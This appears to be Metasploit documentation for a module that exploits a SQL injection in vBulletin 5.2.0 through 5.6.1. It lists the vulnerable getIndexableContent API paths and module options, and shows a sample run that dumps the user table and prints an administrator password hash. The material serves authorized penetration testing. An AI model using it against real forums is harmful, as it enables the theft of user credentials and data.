## Vulnerable Application

  [vBulletin](https://www.vbulletin.com) A popular PHP bulletin board and blog web application.
  This module has been tested successfully against vBulletin 5.6.1 running on Ubuntu Linux 19.04

### Description

This module exploits a SQL injection vulnerability present in vBulletin 5.2.0 through 5.6.1 in the
`getIndexableContent` function. This vulnerability is triggered through the `nodeId` variable and
can be reached through multiple paths (listed below) but is exploited in this module utilizing the
`/ajax/api/content_infraction/getIndexableContent` path.

- /ajax/api/content_video/getIndexableContent
- /ajax/api/content_text/getIndexableContent
- /ajax/api/content_report/getIndexableContent
- /ajax/api/content_redirect/getIndexableContent
- /ajax/api/content_privatemessage/getIndexableContent
- /ajax/api/content_poll/getIndexableContent
- /ajax/api/content_photo/getIndexableContent
- /ajax/api/content_link/getIndexableContent
- /ajax/api/content_infraction/getIndexableContent
- /ajax/api/content_gallery/getIndexableContent
- /ajax/api/content_event/getIndexableContent
- /ajax/api/content_channel/getIndexableContent
- /ajax/api/content_attach/getIndexableContent

Each path listed above reaches the `getIndexableContent` function within the `/core/vb/library/content.php`
file. The SQL injection attack used utilizes a UNION query in order to leak data back in the response
`rawtext` field. The data stored on the file system contains the entire `user` table or a dump of all the
vBulletin tables in json format.

## Verification Steps

1. Do: ```use auxiliary/gather/vbulletin_getindexablecontent_sqli```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set VHOST [HOSTNAME]```
4. Do: ```set TARGETURI [PATH]```
5. Do: ```run```

## Options

### NODE

A valid node id value for the vBulletin install. When provided, this value is used instead of that acquired
by brute-forcing

### MINNODE

A minimum nodeid value to begin with when brute-forcing for a valid node id. **Default: 1**

### MAXNODE

A maximum nodeid value to end with when brute-forcing for a valid node id. **Default: 200**

### TARGETURI

The base URI path of vBulletin. **Default: /**

## Scenarios

```
msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set VHOST vb.local
VHOST => vb.local
msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set TARGETURI /
TARGETURI => /vb5
msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > show actions 

Auxiliary actions:

   Name      Description
   ----      -----------
   DumpAll   Dump all tables used by vbulletin.
   DumpUser  Dump only user table used by vbulletin.

msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > run

[*] Running module against 192.168.1.100
[*] Brute forcing to find a valid node id.
[+] Sucessfully found node at id 1
[*] Attempting to determine the vBulletin table prefix.
[+] Sucessfully retrieved table to get prefix from vb5_language.
[*] Getting table columns for vb5_user
[+] Retrieved 78 columns for vb5_user
[*] Dumping table vb5_user
[*] Table contains 1 rows, dumping (this may take a while).
[+] Found credential: administrator:$2y$15$I5t0BGBeYaYGbaRhhBr8g.EBax846Jx3B6ady..nwuPxOWAYicYvi (Email: zenofex@exploitee.rs)
[+] Retrieved 1 rows for vb5_user
[+] Saved file to: /home/zenofex/.msf4/loot/20200522180431_default_192.168.1.100_vb5_user_305077.txt
[*] Auxiliary module execution completed

```
